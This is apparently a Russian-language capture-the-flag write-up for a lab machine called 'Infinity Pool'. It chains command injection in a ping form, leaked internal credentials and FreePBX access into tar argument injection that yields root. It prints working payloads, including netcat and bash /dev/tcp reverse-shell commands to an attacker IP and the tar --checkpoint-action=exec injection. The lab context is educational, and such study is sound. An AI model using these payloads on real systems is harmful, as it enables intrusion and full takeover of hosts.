# Infinity Pool

### 1. Nmap-скан

Первоначальный Nmap-скан:

```text
22/tcp  SSH
80/tcp  HTTP — Gunicorn
```


### 2. Web Application

На `80/tcp` обнаружено веб-приложение. На главной странице присутствовала кнопка бронирования номера, однако функциональность была отключена.

При анализе:

```text
/static/app.js
```

обнаружен комментарий:

```javascript
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed™");
```

Из него были выделены интересующие endpoint'ы:

```text
/status
/internal/netcheck
```


### 3. `/status` → `/internal/checker`

При обращении к `/status` происходил redirect на:

```text
/internal/checker
```

На странице находилась форма проверки хоста в сети.

Первоначальный тест:

```text
127.0.0.1
```

Результат:

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.046 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.046/0.046/0.000/0.000 ms
```


### 4. Command Injection → Web Shell

Была проверена возможность внедрения команд:

```text
127.0.0.1;id
```

Результат:

```text
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.045/0.045/0.045/0.000 ms
uid=1001(web) gid=1001(web) groups=1001(web)
```

Подтверждена **OS Command Injection** с правами пользователя `web`.

Получен reverse shell:

```text
127.0.0.1;busybox nc 192.168.130.11 4444 -e sh
```

Получен shell:

```text
web@tryhackme-2404
```

После получения shell обнаружена веб-директория пользователя `asterisk`:

```text
web@tryhackme-2404:/var/www/html$ ls -la
total 36
drwxrwxr-x  3 asterisk asterisk  4096 Jun 30 09:13 .
drwxr-xr-x  4 root     root      4096 Jun 30 09:07 ..
-rw-rw-r--  1 asterisk asterisk    16 Jun 30 09:10 .htaccess
drwxrwxr-x 10 asterisk asterisk  4096 Jul 25 16:39 admin
-rw-rw-r--  1 asterisk asterisk 10671 Jun 30 09:08 index.html
-rw-rw-r--  1 asterisk asterisk   453 Jun 30 09:10 index.php
-rw-rw-r--  1 asterisk asterisk   361 Jun 30 09:10 robots.txt
lrwxrwxrwx  1 asterisk asterisk    38 Jun 30 09:13 ucp -> /var/www/html/admin/modules/ucp/htdocs
```


### 5. Internal Services / Privilege Escalation Enumeration

После получения shell был выполнен анализ локально слушающих сервисов:

```text
tcp LISTEN 127.0.0.53:53
tcp LISTEN 127.0.0.1:3306
tcp LISTEN 127.0.0.1:8080
tcp LISTEN 127.0.0.1:8088
tcp LISTEN 127.0.0.1:8089
tcp LISTEN 127.0.0.54:53
tcp LISTEN 0.0.0.0:80
tcp LISTEN 0.0.0.0:22
tcp LISTEN 127.0.0.1:9000
tcp LISTEN 127.0.0.1:3000
tcp LISTEN 127.0.0.1:5038
tcp LISTEN [::]:22
```

Особый интерес представляли:

```text
127.0.0.1:3000
127.0.0.1:8080
127.0.0.1:9000
```

Была обнаружена cron-задача от `root`:

```text
# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
```

Исполняемый файл:

```text
/usr/lib/php/sessionclean
```

был проверен на возможность записи, однако файлы были недоступны пользователю `web` для модификации.

Данный вектор повышения привилегий не сработал.

Для пользователя `web` был создан и добавлен SSH-ключ.

Для исследования внутреннего сервиса `3000` использовался port forwarding:

```bash
ssh -L 3000:127.0.0.1:3000 web@10.112.138.249 -N -i web_key
```


### 6. localhost:3000 → Credentials

На `127.0.0.1:3000` был обнаружен внутренний сервис.

В интерфейсе найдены:

```json
{
  "automation_endpoint":"http://127.0.0.1:9000",
  "note":"internal network only -- do not expose",
  "ops_note":"UCP still on default template creds (FreePBXUCPTemplateCreator) -- ROTATE.",
  "telephony_pass":"St4yN0t1c3d_2026",
  "telephony_portal":"http://127.0.0.1:8080/ucp",
  "telephony_user":"FreePBXUCPTemplateCreator"
}
```

Получены credentials:

```text
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

Также обнаружен внутренний Automation Service:

```text
http://127.0.0.1:9000
```

Порт `8080` был проброшен локально.

Авторизация в UCP:

```text
FreePBXUCPTemplateCreator:St4yN0t1c3d_2026
```

успешна.


### 7. FreePBX / UCP

В FreePBX обнаружена версия:

```text
FreePBX 16.0.39
```

Были проверены несколько известных вариантов эксплуатации FreePBX:

1. Hardcoded credentials в FreePBX-конфигах — проблема исправлена в `16.0.45`.
2. Authenticated PHP RCE в FreePBX 16 через `host` — не сработал.
3. CVE-2025-5781.
4. CVE-2025-57819 + CVE-2025-61678 — SQLi + RCE.

Данные варианты эксплуатации результата не дали.


### 8. localhost:9000 — Automation Service

Дополнительно был проброшен порт `9000`.

Endpoint:

```text
http://localhost:9000/health
```

вернул:

```json
{
  "endpoints":{
    "GET /health":"service status",
    "POST /jobs/export":{
      "auth":"Authorization: Bearer <automation key>",
      "body":{
        "report":"<report name>"
      },
      "desc":"archive the latest data export"
    }
  },
  "runs_as":"root",
  "service":"automation",
  "status":"ok"
}
```

Критичные сведения:

```text
service: automation
runs_as: root
POST /jobs/export
Authorization: Bearer <automation key>
```


### 9. Получение Automation Key

В интерфейсе FreePBX была обнаружена возможность создания виджета.

При добавлении **Voicemail Widget** появился необходимый `automation_key`:

```text
cc_auto_7b3f9a1c4e0d2f6a
```

После этого был отправлен запрос:

```http
POST /jobs/export HTTP/1.1
Host: localhost:9000
Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a
Content-Type: application/json

{"report":"test"}
```

Ответ:

```json
{
  "command":"tar czf /var/automation/exports/test.tgz /var/automation/data 2>&1",
  "output":"tar: Removing leading `/' from member names\n"
}
```

Таким образом, было установлено, что значение `report` непосредственно участвует в формировании команды:

```text
tar czf /var/automation/exports/<report>.tgz /var/automation/data 2>&1
```


### 10. Command Injection / Root RCE

Попытки классической command injection через:

```text
;
|
```

результата не дали.

Дальнейший анализ показал возможность **argument injection в `tar`** через пользовательский параметр `report`.

Использован payload:

```json
{"report":"test --checkpoint=1 --checkpoint-action=exec=id %0a"}
```

Полученная команда:

```text
"command":"tar czf /var/automation/exports/test --checkpoint=1 --checkpoint-action=exec=id %0a.tgz /var/automation/data 2>&1"
```

Ответ:

```text
tar: %0a.tgz: Cannot stat: No such file or directory
tar: Removing leading `/' from member names
tar: Removing leading `/' from hard link targets
uid=0(root) gid=0(root) groups=0(root)
tar: Exiting with failure status due to previous errors
```

Строка:

```text
uid=0(root) gid=0(root) groups=0(root)
```

подтвердила выполнение произвольной команды от имени `root`.

`%0a` при этом не был интерпретирован как newline и остался частью имени файла:

```text
%0a.tgz
```

Для получения полноценного root shell был использован:

```json
{"report":"test --checkpoint=1 --checkpoint-action=exec='bash -c \"bash -i >& /dev/tcp/192.168.130.11/5555 0>&1\"' %0a"}
```

В результате получен **reverse shell с правами root**:

```text
uid=0(root)
gid=0(root)
groups=0(root)
```

Итоговая цепочка эксплуатации:

```text
Web Command Injection
        ↓
web shell
        ↓
localhost service enumeration
        ↓
credentials на :3000
        ↓
FreePBX UCP
        ↓
automation_key
        ↓
localhost:9000
        ↓
tar argument injection
        ↓
--checkpoint-action=exec
        ↓
root RCE
        ↓
root reverse shell
```


## Достижения

* **Впервые самостоятельно выполнена эксплуатация FreePBX**.
* Проведён анализ **FreePBX 16.0.39**, UCP и связанных внутренних сервисов.
* Найдена полная цепочка **Web Command Injection → web → внутренние сервисы → FreePBX/UCP → automation key → `tar` argument injection → root RCE**.
* Получен полноценный **root reverse shell** на целевой машине.
* На практике освоена эксплуатация `tar` через:

  ```text
  --checkpoint=1
  --checkpoint-action=exec=<command>
  ```
* Получен практический опыт анализа и эксплуатации **локальных сервисов, доступных только через loopback**, с использованием SSH port forwarding.
* Отдельно исследованы несколько известных векторов эксплуатации FreePBX и выполнен переход от поиска готового CVE к анализу **кастомной логики приложения и внутренней инфраструктуры**.
